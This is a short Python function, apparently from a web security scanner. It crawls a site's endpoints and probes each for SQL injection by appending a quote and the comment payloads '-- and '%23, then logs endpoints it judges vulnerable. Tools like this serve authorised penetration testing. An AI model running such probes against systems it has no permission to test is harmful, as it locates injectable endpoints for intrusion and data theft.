import requests

from utils.auxiliary import *
from utils.crawler import *


def try_url_param_sqli(url) -> list:
    l = Auxiliary(__name__)
    l.set_config()
    options = [[], "", "False"]
    endpoints = crawl_webpage_endpoints(url)
    for endp in endpoints:
        r = requests.get(url=url + endp + "'")
        if r.status_code == 500:
            l.logger.info(f"[*] Possible SQLi is found on endpoint {endp}'")
            r_1 = requests.get(url=url + endp + "'--")
            if r_1.status_code == 200:
                l.logger.info(
                    f"[+] Confirmed SQLi is found on endpoint {endp}'--")
                options[0].append(endp)  # Adding our options to a list
                options[1] = "--"
                options[2] = "True"
            r_2 = requests.get(url=url + endp + "'%23")
            if r_2.status_code == 200:
                l.logger.info(
                    f"[+] Confirmed SQLi is found on endpoint {endp}'#")
                options[0].append(endp)  # Adding our options to a list
                options[1] = "#"
                options[2] = "True"
        else:
            l.logger.info(
                f"[-] Endpoint {endp} is likely not vulnerable to SQLi")
    return options
